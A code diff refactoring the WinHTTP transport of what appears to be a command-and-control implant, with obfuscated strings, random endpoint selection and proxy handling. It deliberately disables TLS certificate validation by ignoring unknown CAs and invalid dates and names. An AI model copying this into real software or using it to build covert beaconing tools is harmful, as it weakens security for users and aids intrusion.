@@ -70,7 +70,6 @@ namespace Http {
 
         _request *request = R_CAST(_request*, x_malloc(sizeof(_request)));
         uint32_t n_endpoint = 0;
-        uint32_t flags = 0;
 
         if (!Ctx->Transport.http->handle) {
             if (!(Ctx->Transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->Transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
@@ -85,12 +84,12 @@ namespace Http {
         n_endpoint          = Utils::Random::RandomNumber32();
         request->endpoint   = Ctx->Transport.http->endpoints[n_endpoint % Ctx->Transport.http->n_endpoints];
 
-        flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
+        Ctx->Transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
         if (Ctx->Transport.bSSL) {
-            flags |= WINHTTP_FLAG_SECURE;
+            Ctx->Transport.http->flags |= WINHTTP_FLAG_SECURE;
         }
 
-        if (!(request->req_handle = Ctx->win32.WinHttpOpenRequest(request->conn_handle, Ctx->Transport.http->method, request->endpoint, nullptr, nullptr, nullptr, flags))) {
+        if (!(request->req_handle = Ctx->win32.WinHttpOpenRequest(request->conn_handle, Ctx->Transport.http->method, request->endpoint, nullptr, nullptr, nullptr, Ctx->Transport.http->flags))) {
             return_defer(ntstatus);
         }
 
@@ -109,18 +108,6 @@ namespace Http {
         // _proxy_context is a temporary store and can be discarded
 
         _proxy_context *proxy_ctx = R_CAST(_proxy_context*, x_malloc(sizeof(_proxy_context)));
-        uint32_t flags  = 0;
-
-        if (Ctx->Transport.bSSL) {
-            flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-
-            if (!Ctx->win32.WinHttpSetOption(request->req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(ULONG))) {
-                return_defer(ntstatus);
-            }
-        }
 
         if (Ctx->Transport.bProxy) {
             proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
@@ -178,7 +165,7 @@ namespace Http {
                     }
                 }
             }
-            Ctx->Transport.bEnvProxyCheck = TRUE;
+            Ctx->Transport.bEnvProxyCheck = true;
         }
 
         if (Ctx->Transport.EnvProxy) {
@@ -207,12 +194,24 @@ namespace Http {
         uint32_t status     = 0;
         uint32_t n_status   = sizeof(uint32_t);
 
-        Ctx->Transport.http->method = OBFW(L"GET");
+        Ctx->Transport.http->method = OBFW(L"GET"); // todo: dynamic method selection/context-based?
+
         if (
             !(request = CreateRequestContext()) ||
             !(proxy_ctx = CreateProxyContext(request)) ||
             !SetHeaders(request)) {
             return_defer(ntstatus);
+        }
+
+        if (Ctx->Transport.bSSL) {
+            Ctx->Transport.http->flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+
+            if (!Ctx->win32.WinHttpSetOption(request->req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->Transport.http->flags, sizeof(ULONG))) {
+                return_defer(ntstatus);
+            }
         }
         if (
             !Ctx->win32.WinHttpSendRequest(request->req_handle, nullptr, 0, out->Buffer, out->Length, out->Length, 0) ||
